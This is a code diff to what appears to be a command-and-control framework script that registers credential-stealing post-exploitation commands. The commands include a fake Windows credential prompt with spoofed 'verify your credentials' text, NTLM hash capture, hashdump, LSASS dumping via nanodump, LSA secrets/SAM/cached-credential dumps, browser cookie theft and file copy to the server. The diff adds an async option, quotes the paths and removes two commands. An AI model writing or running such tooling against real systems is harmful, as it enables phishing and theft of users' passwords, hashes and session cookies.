@@ -9,6 +9,7 @@ ax.script_import(ax.script_dir() + "cookie-monster/cookie-monster.axs")
 /// COMMANDS
 
 var cmd_askcreds = ax.create_command("askcreds", "Prompt for credentials", "askcreds -p \"Windows Update\"");
+cmd_askcreds.addArgBool("--async", "Use Async BOF");
 cmd_askcreds.addArgFlagString("-p", "prompt",    "", "Restore Network Connection");
 cmd_askcreds.addArgFlagString("-n", "note",      "", "Please verify your Windows user credentials to proceed");
 cmd_askcreds.addArgFlagInt(   "-t", "wait_time", "", 30);
@@ -16,27 +17,14 @@ cmd_askcreds.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let prompt    = parsed_json["prompt"];
     let note      = parsed_json["note"];
     let wait_time = parsed_json["wait_time"];
+    let async = "";
+    if (parsed_json["--async"]) async = "-a ";
+
 
     let bof_params = ax.bof_pack("wstr,wstr,int", [prompt, note, wait_time]);
     let bof_path = ax.script_dir() + "_bin/askcreds." + ax.arch(id) + ".o";
 
-    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "BOF implementation: askcreds");
-});
-
-
-
-var cmd_autologon = ax.create_command("autologon", "Checks the registry for autologon information", "autologon");
-cmd_autologon.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
-    let bof_path = ax.script_dir() + "_bin/autologon." + ax.arch(id) + ".o";
-    ax.execute_alias(id, cmdline, `execute bof ${bof_path}`, "BOF implementation: autologon");
-});
-
-
-
-var cmd_credman = ax.create_command("credman", "Checks the current user's Windows Credential Manager for saved web passwords", "credman");
-cmd_credman.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
-    let bof_path = ax.script_dir() + "_bin/credman." + ax.arch(id) + ".o";
-    ax.execute_alias(id, cmdline, `execute bof ${bof_path}`, "BOF implementation: credman");
+    ax.execute_alias(id, cmdline, `execute bof ${async}"${bof_path}" ${bof_params}`, "BOF implementation: askcreds");
 });
 
 
@@ -50,7 +38,7 @@ cmd_get_ntlm.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let bof_params = ax.bof_pack("int", [no_ess]);
     let bof_path = ax.script_dir() + "_bin/get-netntlm." + ax.arch(id) + ".o";
 
-    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "BOF implementation: Internal Monologue");
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "BOF implementation: Internal Monologue");
 });
 
 
@@ -73,7 +61,7 @@ cmd_hashdump.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     }
     let bof_path = ax.script_dir() + "_bin/hashdump." + ax.arch(id) + ".o";
 
-    ax.execute_alias(id, cmdline, `execute bof ${bof_path}`, "BOF implementation: hashdump", hook);
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path}"`, "BOF implementation: hashdump", hook);
 });
 
 
@@ -233,7 +221,7 @@ cmd_lsadump_secrets.setPreHook(function (id, cmdline, parsed_json, ...parsed_lin
         return task;
     }
     let bof_path = ax.script_dir() + "_bin/lsadump_secrets." + ax.arch(id) + ".o";
-    ax.execute_alias(id, cmdline, `execute bof ${bof_path}`, "BOF: lsadump::secrets", hook);
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path}"`, "BOF: lsadump::secrets", hook);
 });
 
 
@@ -252,7 +240,7 @@ cmd_lsadump_sam.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) 
         return task;
     }
     let bof_path = ax.script_dir() + "_bin/lsadump_sam." + ax.arch(id) + ".o";
-    ax.execute_alias(id, cmdline, `execute bof ${bof_path}`, "BOF: lsadump::sam", hook);
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path}"`, "BOF: lsadump::sam", hook);
 });
 
 
@@ -275,7 +263,7 @@ cmd_lsadump_cache.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines
         return task;
     }
     let bof_path = ax.script_dir() + "_bin/lsadump_cache." + ax.arch(id) + ".o";
-    ax.execute_alias(id, cmdline, `execute bof ${bof_path}`, "BOF: lsadump::cache", hook);
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path}"`, "BOF: lsadump::cache", hook);
 });
 
 
@@ -310,13 +298,13 @@ cmd_underlaycopy.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)
     let bof_path = ax.script_dir() + "_bin/underlaycopy." + ax.arch(id) + ".o";
 
     let task_desc = download ? "Task: UnderlayCopy file copy and download to server" : "Task: UnderlayCopy file copy";
-    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, task_desc);
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, task_desc);
 });
 
 
 
 var group_test = ax.create_commands_group("Creds-BOF", [
-    cmd_askcreds, cmd_autologon, cmd_credman, cmd_get_ntlm, cmd_hashdump, cmd_cookie_monster,
+    cmd_askcreds, cmd_get_ntlm, cmd_hashdump, cmd_cookie_monster,
     cmd_nanodump, cmd_nanodump_ppl_dump, cmd_nanodump_ppl_medic, cmd_nanodump_ssp, cmd_underlaycopy,
     cmd_lsadump_secrets, cmd_lsadump_sam, cmd_lsadump_cache
 ]);
